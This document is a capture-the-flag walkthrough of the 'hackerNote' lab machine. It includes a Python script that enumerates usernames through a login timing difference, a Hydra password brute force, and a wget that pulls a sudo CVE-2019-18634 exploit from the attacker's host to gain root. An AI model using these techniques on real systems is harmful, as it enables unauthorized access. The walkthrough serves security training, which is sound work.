# IP
10.10.95.113

## Enumeration

### Rustscan
Found 3 ports running on the machine.
```console
❯ rustscan -a 10.10.95.113 --ulimit 5000 -- -sC -sV | tee rustscan.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/divu050704/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.95.113:22
Open 10.10.95.113:80
Open 10.10.95.113:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-20 16:03 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:03
Completed NSE at 16:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:03
Completed NSE at 16:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:03
Completed NSE at 16:03, 0.00s elapsed
Initiating Ping Scan at 16:03
Scanning 10.10.95.113 [2 ports]
Completed Ping Scan at 16:03, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:03
Completed Parallel DNS resolution of 1 host. at 16:03, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:03
Scanning 10.10.95.113 [3 ports]
Discovered open port 8080/tcp on 10.10.95.113
Discovered open port 22/tcp on 10.10.95.113
Discovered open port 80/tcp on 10.10.95.113
Completed Connect Scan at 16:03, 0.15s elapsed (3 total ports)
Initiating Service scan at 16:03
Scanning 3 services on 10.10.95.113
Completed Service scan at 16:04, 12.38s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.95.113.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:04
Completed NSE at 16:04, 4.43s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:04
Completed NSE at 16:04, 0.60s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:04
Completed NSE at 16:04, 0.00s elapsed
Nmap scan report for 10.10.95.113
Host is up, received syn-ack (0.15s latency).
Scanned at 2022-11-20 16:03:51 IST for 17s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0njoI1MTN18O8+mhh7M4EpPVA2+5B3OsOtfyhpjYadmUYmS1LgxRSCAyUNFP3iKM7vmqbC9KalD6hUSWmorDoPCzgTuLPf6784OURkFZeZMmC3Cw3Qmdu348Vf2kvM0EAXJmcZG3Y6fspIsNgye6eZkVNHZ1m4qyvJ+/b6WLD0fqA1yQgKhvLKqIAedsni0Qs8HtJDkAIvySCigaqGJVONPbXc2/z2g5io+Tv3/wC/2YTNzP5DyDYI9wL2k2A9dAeaaG51z6z02l6F1zGzFwiwrFP+fopEjhQUa99f3saIgoq3aPOJ/QufS1SiZc6AqeD8RJ/6HWz10timm5A+n4J
|   256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKcOFLvSTrwsitMygOlMRDEZIfujX3UEXx9cLfrmkYnn0dHtHsmkcUUMc1YrwaZlDeORnJE5Z/NAH70GaidO2s=
|   256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGFFNuuI7oo+OdJaPnUbVa1hN/rtLQalzQ1vkgWKsF9z
80/tcp   open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Home - hackerNote
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
8080/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Home - hackerNote
|_http-open-proxy: Proxy might be redirecting requests
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:04
Completed NSE at 16:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:04
Completed NSE at 16:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:04
Completed NSE at 16:04, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.26 seconds
```


### Web (:8080 `/`)
- On going to (http://10.10.95.113:8080/) we are presented with a home-screen with login option.
- Redirected to (http://10.10.95.113:8080/login).
- Created a new user with creds `test : 123`.
- Logged in with new creds but didn't find anything.
- Logged out and tried logging in to invalid username, unsuccessful.
- Tried logging in with wrong password, unsuccessful, but we could see a time difference between requests for invalid username and wrong password.
- This means that the application is first checking whether the username is valid or not and then checking the password.
- Created a python script to get a valid username.

## Exploitation

### User Access

#### Python Script (Valid username)
- We know that a wrong username is fast and wrong password takes time, so we will make a python script which we will return valid username only when the request takes some time.

```python
import time
import requests
import sys

def print_percent_done(index, total, bar_len=50, title='Please wait'):
    '''
    index is expected to be 0 based index.
    0 <= index < total
    '''
    percent_done = (index+1)/total*100
    percent_done = round(percent_done, 1)

    done = round(percent_done/(100/bar_len))
    togo = bar_len-done

    done_str = '█'*int(done)
    togo_str = '░'*int(togo)

    print(f'\t⏳{title}: [{done_str}{togo_str}] {index}/{total} done', end='\r')

    if round(percent_done) == 100:
        print('\t✅')

file = open("wordlist.txt","r")
data = file.readlines()
print("\n")
valid = []
for i in  range(len(data)):
    start_time = time.time()
    creds = {"username":data[i],"password":"456"}
    req = requests.post("http://10.10.95.113:8080/api/user/login",creds)
    end_time = time.time()
    total_time = (end_time-start_time)

    if total_time >=1 :
        valid.append(data[i])
    else:
        print_percent_done(i,len(data))
        time.sleep(.02)


for user in valid:
    print(user+" is likely valid!")

file.close()
```

- Found username `james`.

#### Hydra
- Created a wordlist combining `colors.txt` and `names.txt`

```console
❯ /opt/hashcat-utils-1.9/bin/combinator.bin  colors.txt numbers.txt > passwords.txt
```
- Started hydra with password list as `passwords.txt` and username  as `james`.

```console
❯ hydra 10.10.95.113 -s 8080  -f http-form-post "/api/user/login:username=^USER^&password=^PASS^:Invalid username Or Password" -l james -P passwords.txt
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-20 17:52:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 180 login tries (l:1/p:180), ~12 tries per task
[DATA] attacking http-post-form://10.10.95.113:8080/api/user/login:username=^USER^&password=^PASS^:Invalid username Or Password
[STATUS] 48.00 tries/min, 48 tries in 00:01h, 132 to do in 00:03h, 16 active
[8080][http-post-form] host: 10.10.95.113   login: james   password: blue7
[STATUS] attack finished for 10.10.95.113 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-20 17:53:44
```
- Found password `blue7` for `james`.
- Logged in and found ssh password for james

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Notes - hackerNote</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="../main.css">
    <script src="../main.js"></script>
    <script src="note.js"></script>
</head>
<body onload="getNotes()">
    <div class="navbar">
        <h1 class="title">hackerNote</h1>
        <button onclick="document.cookie='SessionToken=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';postData('/api/user/logout');window.location='/';">Logout</button>
    </div>
    <h2 class="margin">Your notes:</h2>
    <button id="newNote" class="margin" onclick="noteDialog()">Create New Note</button>
    <form id="notesForm" class="margin" style="display: none;">
        <input id="Title" placeholder="Title" style="width: 50%"><br>
        <textarea class="margin" id="Content" placeholder="Contents" type="text" style="width: 50%"></textarea><br>
        <button id="newNoteButton" class="margin" type="button" onclick="createNote()">Create Note</button>
        <button id="cancel" type="button" onclick="cancelNote()">Cancel</button>
    </form>
    <div id="notesDiv">
    </div>
</body>
</html>
```

#### Secure Shell 
- Logged in as James to the machine 

```console
❯ ssh james@10.10.95.113
The authenticity of host '10.10.95.113 (10.10.95.113)' can't be established.
ED25519 key fingerprint is SHA256:0Fb40mE1AmcHWbg2H7/8Afq+0Uk5vLB/UrPPvJ9AxLM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.95.113' (ED25519) to the list of known hosts.
james@10.10.95.113's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Nov 20 12:37:05 UTC 2022

  System load:  0.08              Processes:           86
  Usage of /:   49.2% of 9.78GB   Users logged in:     0
  Memory usage: 8%                IP address for eth0: 10.10.95.113
  Swap usage:   0%


59 packages can be updated.
0 updates are security updates.


Last login: Mon Feb 10 11:58:27 2020 from 10.0.2.2
james@hackernote:~$ ls
user.txt
james@hackernote:~$ cat user.txt
thm{56911bd7ba1371a3221478aa5c094d68}
```

### Privilege Escalation
- When we run `sudo -l`, it show asterisks as password it might be vulnerable to `pwdfeedback` exploit.
- Checked sudo version

```console
james@hackernote:~$ sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

- Seems to be vulnerable, which can be confirmed from [here](https://www.sudo.ws/security/advisories/pwfeedback/#sudo-versions-affected)
- Downloaded [this](https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c)
- Moved to `/tmp` directory of compromised machine.

```console
james@hackernote:/tmp$ wget http://10.17.0.215/exploit.c
--2022-11-20 12:44:27--  http://10.17.0.215/exploit.c
Connecting to 10.17.0.215:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6311 (6.2K) [text/x-csrc]
Saving to: ‘exploit.c’

exploit.c            100%[======================>]   6.16K  --.-KB/s    in 0.002s

2022-11-20 12:44:28 (2.63 MB/s) - ‘exploit.c’ saved [6311/6311]
```

- Made binary with `gcc` and ran the exploit.

```console
james@hackernote:/tmp$ gcc exploit.c -o ./exploit
james@hackernote:/tmp$ ./exploit
[sudo] password for james:
Sorry, try again.
# whoami
root

```
